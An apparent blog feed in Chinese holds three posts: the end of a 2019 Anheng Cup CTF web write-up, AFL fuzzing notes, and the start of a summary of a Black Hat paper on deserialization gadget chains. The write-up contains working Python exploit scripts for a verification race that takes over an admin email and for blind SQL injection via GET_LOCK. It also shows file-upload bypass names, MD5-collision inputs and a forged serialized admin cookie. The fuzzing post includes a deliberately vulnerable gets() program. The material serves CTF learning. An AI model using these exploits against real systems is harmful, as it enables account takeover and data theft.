&#39;&#39;);</code>时，再次请求重置邮箱，由于class.user.php::validate_email()没有检查valid状态，导致新的email被写入，程序再回到<code>zUserFile::update_attr($username, &#39;email_verify&#39;, 1);</code>，那么攻击这就可以重置任意邮箱了。</p><p>梳理一下思路，也就是：</p><ol><li>注册用户验证邮箱</li><li>重置邮箱（这里邮箱还写自己的）</li><li>收到校验链接</li><li>在请求校验链接同时，再次重置邮箱为管理员邮箱（ambulong@vulnspy.com，注册界面出现过），若该步骤在比较token一致—-&gt;set(email_verify=1)中间执行，则条件竞争成功。</li></ol><p>因此有以下PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">HOST = <span class="string">"http://114.55.36.69:8023"</span></span><br><span class="line">VERIFY_URL = <span class="string">"/verify.php?token=7lGBgYOtvxoW7mRHdsGEFJqr6YMDIJjD&amp;username=admin1"</span></span><br><span class="line">SESSION=<span class="string">"h5evpbu7eclfe0kpfe3fad01q1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_verify</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(HOST + VERIFY_URL)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_email</span><span class="params">()</span>:</span></span><br><span class="line">    burp0_url = HOST + <span class="string">"/chgemail.php?token=JaX1dpl3"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: SESSION&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"email"</span>: <span class="string">"ambulong@vulnspy.com"</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">    res=requests.post(</span><br><span class="line">        burp0_url,</span><br><span class="line">        cookies=burp0_cookies,</span><br><span class="line">        data=burp0_data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = threading.Thread(target=send_verify, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    poc()</span><br></pre></td></tr></table></figure><p>运行后看到邮箱被修改，切换用户就能拿到flag了</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571219028911.png" alt="1571219028911"></p><h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>PHP特性，</p><ol><li><p>参数名为A.A会转变为A_A，</p></li><li><p>数组&gt;inf</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196679531.png" alt="1571196679531"></p></li><li><p>数组转换成字符串时会出错，因此结果==0</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196848622.png" alt="1571196848622"></p></li></ol><p>因此有payload：<code>/?A.A[]=1</code></p><h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><p>73-81行需要传一个合法zip文件，无法绕过：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211251759.png" alt="1571211251759"></p><p>接着，92-105行解压zip，并且移动到upload目录下：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211484309.png" alt="1571211484309"></p><p>要求zip中存在图片后缀的文件，并且不包含”.ph”字符，可以通过”x.pHp.jpg”绕过，上传成功：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211770075.png" alt="1571211770075"></p><h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>敏感路径扫描，发现<code>/robots.txt</code>泄露，打开发现提示</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571199573631.png" alt="1571199573631"></p><p>以及注入点 <code>/article.php?id=2</code></p><p>跑黑名单，发现select、sleep和benchmark都banned，解法是通过GET_LOCK</p><blockquote><p>GET_LOCK(str,timeout)<br>Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.</p></blockquote><p>因此尝试<code>/article.php?id=2&#39; and (get_lock(&#39;vvvv&#39;,10)) #</code>可以成功延时，注意到同表做列查询时不需要用select，因此有如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleepcms</span><span class="params">()</span>:</span></span><br><span class="line">    base_url = <span class="string">"http://114.55.36.69:8007/article.php?id="</span></span><br><span class="line">    dic = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    cur = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"1'/**/and/**/(if(substr(content,&#123;pos&#125;,1)='&#123;char&#125;',get_lock('nonce',3),0))/**/#"</span></span><br><span class="line">            url = base_url+urllib.parse.quote(payload.format(pos=cur,char=i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += str(i)</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sleepcms()</span><br></pre></td></tr></table></figure><p>运行得到flag：<code>flagis{Flag{C221e22A28b933f103f0f88caB68b79b}}</code>，改成小写提交最里面括号的内容</p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>要求<code>$_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])</code>，强网杯原题，参考<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">如何用不同的数值构建一样的MD5</a>。</p><p>指定param1和param2相同的开头，这里以”1”为例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;init.txt</span><br></pre></td></tr></table></figure><p>接着使用fastcoll生成具有相同md5的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">λ fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: <span class="string">'1.txt'</span> and <span class="string">'2.txt'</span></span><br><span class="line">Using prefixfile: <span class="string">'init.txt'</span></span><br><span class="line">Using initial value: b012cf77f9677e37eea923017fc5e83e</span><br><span class="line"></span><br><span class="line">Generating first block: ..</span><br><span class="line">Generating second block: S00....</span><br><span class="line">Running time: 0.641 s</span><br></pre></td></tr></table></figure><p>将1.txt和2.txt内容进行编码后发送即可的得到flag。</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571140925389.png" alt="1571140925389"></p><p>提供代码方便复现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $text1=$_POST["data1"];</span></span><br><span class="line"><span class="comment">// $text2=$_POST["data2"];</span></span><br><span class="line"></span><br><span class="line">$text1=readmyfile(<span class="string">"1.txt"</span>);</span><br><span class="line">$text2=readmyfile(<span class="string">"2.txt"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD51: '</span>. md5($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode ($text1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD52: '</span>.md5($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode($text2));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h1><p>访问网站源代码，看到提示：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131147272.png" alt="1571131147272"></p><p>实际上是说，<code>md5($_POST[&#39;data1&#39;])!=md5($_POST[&#39;data2&#39;])</code>，由于没用全等，用<code>0e</code>绕过即可：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131226817.png" alt="1571131226817"></p><h1 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h1><h2 id="0x01-信息泄露"><a href="#0x01-信息泄露" class="headerlink" title="0x01 信息泄露"></a>0x01 信息泄露</h2><p>首先，dirsearch发现泄露.idea/workspace.xml文件：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192815365.png" alt="1571192815365"></p><p>workspace发现更多的文件：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192935874.png" alt="1571192935874"></p><p>php文件未必能访问，看<code>/web/robots.txt</code>:</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193047923.png" alt="1571193047923"></p><p>访问<code>/web/index.php?r=site/loginuser_1</code>发现有一段注释：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193204265.png" alt="1571193204265"></p><p>到Github搜索关键词，能看到更多的提示：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193458794.png" alt="1571193458794"></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193530702.png" alt="1571193530702"></p><h2 id="0x02-反序列化垂直越权"><a href="#0x02-反序列化垂直越权" class="headerlink" title="0x02 反序列化垂直越权"></a>0x02 反序列化垂直越权</h2><p>看提示大概是要用反序列化做垂直越权了：</p><p>先抓包登录，然后cookie字段被塞了一个cib字段</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193790173.png" alt="1571193790173"></p><p>考虑到注释里面，sign需要的id，name都是可控的，伪造一个admin的cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'id'</span>=&gt;$id,</span><br><span class="line">                    <span class="string">'name'</span>=&gt;$username,</span><br><span class="line">                    <span class="string">'sign'</span>=&gt;md5($id.$username),</span><br><span class="line">                );</span><br><span class="line"><span class="keyword">echo</span> serialize($sign);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到身份已经成管理员了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194732400.png" alt="1571194732400"></p><p>加一条replace给浏览器用：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194913710.png" alt="1571194913710"></p><h2 id="0x03-上传绕过"><a href="#0x03-上传绕过" class="headerlink" title="0x03 上传绕过"></a>0x03 上传绕过</h2><p>直接上传.php会被ban，考虑到其容器用的Apache/2.2.15，存在解析漏洞，故上传“.php.jpg”</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195205154.png" alt="1571195205154"></p><p>flag在根目录下：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195383816.png" alt="1571195383816"></p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开页面是一个贪吃蛇游戏，js写的：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197503720.png" alt="1571197503720"></p><p><code>/js/game.js</code>代码审计，看到一串颜文字：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197561706.png" alt="1571197561706"></p><p>console运行，返回假flag，跟进去看匿名函数，得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197802703.png" alt="1571197802703"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>2019安恒杯Web安全测试大赛练习赛writeup，<a href="http://flag0.com/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;爱い窒息、痛&quot;&gt;&lt;a href=&quot;#爱い窒息、痛&quot; class=&quot;headerlink&quot; title=&quot;爱い窒息、痛&quot;&gt;&lt;/a&gt;爱い窒息、痛&lt;/h1&gt;&lt;h2 id=&quot;0x01-路径遍历&quot;&gt;&lt;a href=&quot;#0x01-路径遍历&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="CTF" scheme="http://anemone.top/categories/CTF/"/>
    
    
      <category term="PHP" scheme="http://anemone.top/tags/PHP/"/>
    
      <category term="CTF" scheme="http://anemone.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>AFL试用笔记</title>
    <link href="http://anemone.top/fuzz-AFL%E8%AF%95%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/fuzz-AFL试用笔记/</id>
    <published>2019-10-08T12:40:13.000Z</published>
    <updated>2019-10-08T11:29:57.718Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="程序插桩-amp-编译"><a href="#程序插桩-amp-编译" class="headerlink" title="程序插桩&amp;编译"></a>程序插桩&amp;编译</h2><p>有问题程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> login[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Login: \n"</span>);</span><br><span class="line">    gets(login);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Password: \n"</span>);</span><br><span class="line">    gets(passwd);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(login, <span class="string">"root"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(passwd, <span class="string">"1qazxsw2"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted.\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Access Denied.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -fno-stack-protector -z execstack vuln1.c -o vuln1</span><br></pre></td></tr></table></figure><p>如果用make需要设置环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/gittup/binutils</span><br><span class="line"><span class="built_in">export</span> CC=afl-gcc</span><br><span class="line"><span class="built_in">export</span> CXX=afl-g++</span><br></pre></td></tr></table></figure><h2 id="准备输入种子"><a href="#准备输入种子" class="headerlink" title="准备输入种子"></a>准备输入种子</h2><p>创建输入输出目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir testcases results</span><br></pre></td></tr></table></figure><p>在testcases下建立以下三个文件，AFL会读取每个文件的内容，将每一行输入到vuln1的标准输入中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| test1.txt | test2.txt | test3.txt |</span><br><span class="line">| --------- | --------- | --------- |</span><br><span class="line">| a         | root      | root      |</span><br><span class="line">| a         | a         | 1qazxsw2  |</span><br></pre></td></tr></table></figure></p><h3 id="种子精简"><a href="#种子精简" class="headerlink" title="种子精简"></a>种子精简</h3><p><strong>afl-cmin工具</strong>需要一个给定的包含可能的（potential）test case的文件夹，然后运行每一个并将收到的反馈与所有其他的test case进行对比，找到最有效地表示最unique的代码路径的最好的test case。最好的test case被保存到一个新的目录。</p><p> <strong>afl-tmin工具</strong>只用于一个指定的文件。当我们进行fuzzing时，我们不想浪费CPU来处理一些相对于test case表示代码路径来说无用的bit或byte。为了使每一个test case达到表示与原始测试用例相同的代码路径所需的最小值，afl-tmin遍历test case的实际字节，逐步删除很小的数据块，直到删除任意字节都会影响到代码路径表示。</p><h2 id="启动AFL"><a href="#启动AFL" class="headerlink" title="启动AFL"></a>启动AFL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt; /proc/sys/kernel/core_pattern <span class="comment"># WSL不需要</span></span><br><span class="line">afl-fuzz -i ./testcases/ -o ./results/ ./vuln1</span><br></pre></td></tr></table></figure><p>如果程序通过参数读取文件，可以用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i afl_in -o afl_out ./binutils/readelf -a @@</span><br></pre></td></tr></table></figure></p><p>出现以下界面</p><p><img src="/fuzz-AFL试用笔记/1567758115844.png" alt="1567758115844"></p><h2 id="查看crash"><a href="#查看crash" class="headerlink" title="查看crash"></a>查看crash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls results/crashes/ -al</span><br><span class="line">total 4</span><br><span class="line">drwx------ 1 root root 512 Sep  6 16:22 .</span><br><span class="line">drwxrwxrwx 1 root root 512 Sep  6 16:21 ..</span><br><span class="line">-rw------- 1 root root 611 Sep  6 16:21 fuzz-AFL试用笔记.txt</span><br><span class="line">-rw------- 1 root root 137 Sep  6 16:21 id:000000,sig:11,src:000000,op:havoc,rep:64</span><br><span class="line">-rw------- 1 root root  65 Sep  6 16:22 id:000001,sig:11,src:000002,op:havoc,rep:128</span><br></pre></td></tr></table></figure><p>查看一个测试用例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat results/crashes/id:000000,sig:11,src:000000,op:havoc,rep:64</span><br></pre></td></tr></table></figure></p><h1 id="kelinci"><a href="#kelinci" class="headerlink" title="kelinci"></a>kelinci</h1><h2 id="AFL端"><a href="#AFL端" class="headerlink" title="AFL端"></a>AFL端</h2><p>一个C程序作为接口，它与afl-gcc/g++编译出来的程序相同，将AFL的输入通过TCP发送给Java，再将执行结果返回返回给afl。在<code>fuzzerside/</code>下用<code>make</code>编译</p><h2 id="JAVA端"><a href="#JAVA端" class="headerlink" title="JAVA端"></a>JAVA端</h2><p>用于包装fuzz对象，建立一个TCP服务器，返回退出代码和路径信息。它在<code>instrumentor/</code>目录下用<code>gradle build</code>构建</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AFL&quot;&gt;&lt;a href=&quot;#AFL&quot; class=&quot;headerlink&quot; title=&quot;AFL&quot;&gt;&lt;/a&gt;AFL&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;sp
      
    
    </summary>
    
      <category term="Fuzz" scheme="http://anemone.top/categories/Fuzz/"/>
    
    
      <category term="Fuzz" scheme="http://anemone.top/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Automated Discovery of Deserialization Gadget Chain解读</title>
    <link href="http://anemone.top/deserialize-AutoFindPOP/"/>
    <id>http://anemone.top/deserialize-AutoFindPOP/</id>
    <published>2019-08-24T07:15:43.000Z</published>
    <updated>2019-09-22T10:14:18.661Z</updated>
    
    <content type="html"><![CDATA[<p>文章来自Automated Discovery of Deserialization Gadget Chains, Blackhat2018</p><p>文章：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></p><p>演讲视频：<a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> </p><p>工具：<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><p>看下来的感觉就是将jar包里的（可以反序列化的）所有类的属性设为污点（因为反序列化时攻击者都可以控制），接下来做污点传播，Source为toString()，equals()等方法，Sink为Runtime.exec()，Method.invoke()，URL.openStream等方法，而污点清除函数就是黑名单类中的所有函数。</p><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>枚举包内的所有类和方法，对于类收集其父类和子类集合：</p><p><img src="/deserialize-AutoFindPOP/1566118462274.png" alt="1566118462274"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;ClassReference&gt; discoveredClasses</span><br><span class="line">ClassReference(name, superClass, interfaces isInterface, members)</span><br><span class="line">ClassReference.Handle(name)</span><br><span class="line">List&lt;MethodReference&gt; discoveredMethod</span><br><span class="line">MethodReference(classReference, name, desc, isStatic)</span><br><span class="line">MethodReference.Handle(classReference, name, desc)</span><br><span class="line">InheritanceMap //记录了一个类的父类和子类集合，因为一个类拥有其父类的所有方法</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap</span><br></pre></td></tr></table></figure><h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>发现函数传递的数据流，如代码段1中invoke可以传递对象value(0)，代码段2中invoke既可以传递arg(1)也可以传递value(0)，因为我们假设（a）受污染的对象中，所有成员变量都是受污染的（b）程序中所有分支都是可达的（污染传播都是这样做的），0和1为参数index，0代表this。在此之前要先分析函数调用关系，因为如果有A函数：<code>FuncA(){return FuncB();}</code>，那么A函数的返回与B函数有关。</p><p><img src="/deserialize-AutoFindPOP/1566118415853.png" alt="1566118415853"></p><p>output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow</span><br><span class="line">MethodReferenceHandle(classReference, name, desc)</span><br><span class="line">Set&lt;Integer&gt; // 返回一系列污点 0表示this，1为arg1</span><br></pre></td></tr></table></figure><h2 id="Step3"><a href="#Step3" 